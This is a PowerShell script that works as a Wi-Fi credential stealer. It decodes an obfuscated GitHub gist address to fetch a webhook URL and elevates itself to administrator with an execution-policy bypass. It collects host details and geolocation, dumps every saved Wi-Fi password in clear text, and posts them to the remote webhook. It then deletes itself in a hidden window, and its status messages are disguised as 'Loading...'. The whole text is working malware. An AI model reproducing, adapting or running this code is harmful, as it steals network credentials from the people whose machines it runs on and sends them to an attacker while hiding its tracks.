param([string]$WebhookURL,[string]$EncryptionPass,[switch]$Stealth)

$VerboseMode = -not $Stealth
function Write-Log { param([string]$Message); if ($VerboseMode) { Write-Host $Message } }

$_x = "Nzg5MzQ5YzZjMmEwNmRhMGU3NDBlN2I0YjY5N2VhZjk0MWEvd2gudHh0"
$_z = "NWQ5NGFhNTliN2E0YjRiMWI0NjkwOTgyZGU0YjExYjMvcmF3L2U3YWU1"
$_y = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kcm54NjQv"

$ENC_PASS = if ($EncryptionPass) { $EncryptionPass } else { "sqd5-dcwh-default-key" }

if (-not $WebhookURL -and $env:DCWH_URL) { $WebhookURL = $env:DCWH_URL }

if (-not $WebhookURL) {
    try {
        Write-Log "[*] Loading..."
        $gistUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_y + $_z + $_x))
        $whText = (Invoke-WebRequest $gistUrl -TimeoutSec 10).Content
        $hooks = ($whText -split "`r?`n") | Where-Object { $_ -match '^https?://' }
        if ($hooks) { $WebhookURL = ($hooks | Get-Random).Trim(); Write-Log "[*] Loading.." }
    } catch { Write-Log "[*] Loading..." }
}

if (-not $WebhookURL) {
    Write-Log "[-] Loading failed"
    Start-Sleep 5; exit 1
}

if ($WebhookURL -notmatch '^https?://') {
    Write-Log "[-] Loading failed"; Start-Sleep 3; exit 1
}

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Log "[*] Loading..."
    $argList = [System.Collections.ArrayList]@("-NoP", "-EP", "Bypass", "-File", "`"$PSCommandPath`"")
    if ($WebhookURL) { $null = $argList.Add("-WebhookURL"); $null = $argList.Add("`"$WebhookURL`"") }
    if ($EncryptionPass) { $null = $argList.Add("-EncryptionPass"); $null = $argList.Add("`"$EncryptionPass`"") }
    if ($Stealth) { $null = $argList.Add("-Stealth") }
    Start-Process -FilePath powershell -ArgumentList $argList -Verb RunAs
    exit 1
}

Write-Log "[*] Loading..."
$computer = $env:COMPUTERNAME
$cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
$model = if ($cs) { ($cs.Model).Trim() } else { "Unknown" }
$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).Name
$cores = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue).NumberOfCores
$osCaption = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption.Trim()
$dateTime = (Get-Date).ToString("yyyy-MM-dd HH-mm-ss")

Write-Log "[*] Loading..."
try {
    $geo = Invoke-RestMethod "http://ip-api.com/json/?fields=query,city,country,isp" -TimeoutSec 5
    $geoStr = "$($geo.city), $($geo.country) | $($geo.isp)"
} catch { $geoStr = "Unavailable" }

Write-Log "[*] Loading..."
$profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(':',2)[1].Trim() } | Sort-Object -Unique

$wifiEntries = @()
if (-not $profiles) {
    Write-Log "[*] Loading..."
} else {
    foreach ($p in $profiles) {
        $info = netsh wlan show profile name="$p" key=clear 2>$null
        $keyLine = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':',2)[1].Trim() }) -join ''
        if ($keyLine) { $wifiEntries += [PSCustomObject]@{ SSID = $p; PASS = $keyLine } }
    }
}

Write-Log "[*] Loading..."
$maxRetries = 3

# Send system info first
$sysMsg = @{ content = "**$computer** | $model | $cpu`nOS: $osCaption`nGeo: $geoStr" }
$sysJson = $sysMsg | ConvertTo-Json
for ($i = 1; $i -le $maxRetries; $i++) {
    try {
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $sysJson -ContentType "application/json" | Out-Null
        break
    } catch {
        Write-Log "[*] Loading..."
        if ($i -lt $maxRetries) { Start-Sleep 2 }
    }
}

# Send each WiFi credential individually
if ($wifiEntries.Count -gt 0) {
    foreach ($w in $wifiEntries) {
        $msg = @{ content = "SSID: $($w.SSID)`nPASS: $($w.PASS)" }
        $json = $msg | ConvertTo-Json
        for ($i = 1; $i -le $maxRetries; $i++) {
            try {
                Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $json -ContentType "application/json" | Out-Null
                break
            } catch {
                if ($i -lt $maxRetries) { Start-Sleep 1 }
            }
        }
        Start-Sleep 1
    }
} else {
    $msg = @{ content = "No saved credentials found on $computer." }
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body ($msg | ConvertTo-Json) -ContentType "application/json" | Out-Null
}

Write-Log "[*] Loading..."
$sp = $PSCommandPath -replace "'","''"
Start-Process powershell "-NoP -EP Bypass -WindowStyle Hidden -Command `"Start-Sleep 2; ri '$sp' -Fo`""
